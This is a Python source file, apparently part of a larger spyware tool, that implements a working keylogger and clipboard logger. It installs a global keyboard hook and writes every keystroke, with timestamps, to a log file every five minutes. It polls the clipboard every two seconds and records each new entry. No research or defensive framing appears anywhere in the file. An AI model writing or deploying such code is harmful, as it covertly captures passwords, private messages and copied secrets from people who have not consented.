import datetime
import logging
import threading, statics
import time

import keyboard
import pyperclip

key_queue_lock = threading.Lock()
key_queue = list()

logger = logging.getLogger(statics.loggerName)

class KeyPressContainer:
    def __init__(self, key):
        if key == "space":
            self.key = " "
        elif len(key) > 1:
            self.key = str.upper(key)
        else:
            self.key = key
        self.total = 1

    def inc(self):
        self.total += 1

    def __eq__(self, other):
        return self.key == other.key

    def __str__(self):
        if len(self.key) > 1:
            if self.total > 1:
                return f" [{self.key} x{self.total}] "
            else:
                return f" [{self.key}] "
        else:
            return self.key * self.total


def keyhook(event):
    # make a keypress container out of the event
    keyContainer = KeyPressContainer(event.name)
    if event.event_type == 'down':
        # if the key is already in the top of the queue, increment the total
        with key_queue_lock:
            # if queue has keys in it
            if len(key_queue) > 0:
                if key_queue[-1] == keyContainer:
                    key_queue[-1].inc()
                else:
                    key_queue.append(keyContainer)

            else:
                # try:
                #     iEvent = ord(event.name)
                # except:
                #     iEvent = None
                # if iEvent:
                #     if 126 >= iEvent >= 33:
                #         strPrev = str(event.name)
                #         key_queue.put(strPrev)
                # else:
                key_queue.append(keyContainer)


def keylogger(status):
    keyboard.hook(keyhook)
    while status:
        with key_queue_lock:
            if len(key_queue):
                with open(statics.KEYLOGGER_FILE_PATH, "a+") as f:
                    logger.debug("OPENED KEYLOGGER FUNC")
                    try:
                        f.write(f"[{datetime.datetime.now()}] ")
                        while len(key_queue) > 0:
                            f.write(str(key_queue.pop(0)))
                        f.write("\n")
                    except Exception as e:
                        logger.error("Encountered error while trying to set keylog - "+str(e))
        time.sleep(300)


def clipboard_logger(status):
    prevClip = None
    while status:
        cClip = pyperclip.paste()
        if prevClip != cClip:
            prevClip = cClip
            with open(statics.CLIPBOARD_FILE_PATH, "a+") as f:
                logger.debug("OPENED CLIPBOARD FUNC")
                try:
                    f.write(f"[{datetime.datetime.now()}] \n{cClip}\n")
                except Exception as e:
                    logger.error("Encountered error while trying to set clipboard - " + str(e))
        time.sleep(2)